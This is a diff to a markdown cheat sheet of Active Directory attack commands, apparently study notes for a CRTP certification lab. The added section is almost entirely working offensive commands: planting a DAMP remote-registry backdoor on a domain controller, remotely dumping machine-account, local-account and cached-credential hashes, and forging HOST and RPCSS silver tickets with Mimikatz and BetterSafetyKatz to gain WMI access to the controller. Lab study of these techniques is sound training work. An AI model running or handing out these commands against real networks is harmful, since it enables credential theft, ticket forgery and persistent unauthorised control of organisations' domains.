@@ -1908,8 +1908,6 @@ schtasks /Run /S ad.domain.local /TN "STCheck"
 ### Make a silver ticket for WMI
 ```
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
-
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:RPCSS /rc4:<local computer hash> /user:Administrator /ptt"'
 ```
 ### check WMI permission
 ```
@@ -2004,4 +2002,37 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 
 # Persistence - ACLs
 what you are trying to achieve here. we want to try to run a command on the admin controller without having admin privilege. [Reference](https://crtp-certification.certs-study.com/domain-persistence/acls/wmi)
-
+### Using RACE or DAMP, with admin privs on remote machine
+```
+Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
+```
+### As student1, retrieve machine account hash
+```
+Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+```
+### Retrieve local account hash
+```
+Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
+```
+### Retrieve domain cached credentials
+```
+Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
+```
+### Obtaining RCE using sliver ticket
+1. Make a host service ticket 
+```
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /startoffset:0 endin:600 /renewmax:10080 /ptt"'
+```
+2. make an RPCSS service ticket
+```
+BetterSafetyKatz.exe -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:RPCSS /rc4:<local computer hash> /startoffset:0 endin:600 /renewmax:10080 /ptt"'
+```
+3. list the tickets
+```
+klist
+```
+4. startup a new powershell session
+5. run a powershell command to access DC using gwmi
+```
+gwmi -Class win32_operatingsystem -ComputerName dcorp-dc
+```
